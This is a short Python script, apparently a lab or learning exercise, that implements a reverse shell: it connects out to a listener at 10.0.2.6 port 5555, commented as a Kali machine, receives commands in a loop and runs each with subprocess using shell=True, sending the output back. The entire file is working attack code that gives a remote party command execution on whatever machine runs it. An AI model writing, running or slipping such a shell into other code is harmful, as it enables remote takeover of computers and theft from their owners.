import subprocess
import socket

#https://www.geeksforgeeks.org/socket-programming-python/
try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	print ("Socket successfully created")
except socket.error as err:
	print ("socket creation failed with error %s" %(err))
    
#connecting to the server
s.connect(("10.0.2.6", 5555)) #kali IP
print("The socket has successfully connected\n")
s.send(b"Enter quit to stop connection\n")

stop_connect = ""

while stop_connect != "quit\n":
	s.send(b"Enter your command: ")
	data = s.recv(1024).decode("utf-8").strip()
	stop_connect = data
	
	#https://www.geeksforgeeks.org/python-subprocess-module-to-execute-programs-written-in-different-languages/
	result = subprocess.check_output(data, shell = True)
	s.send(result)
s.close()
	
	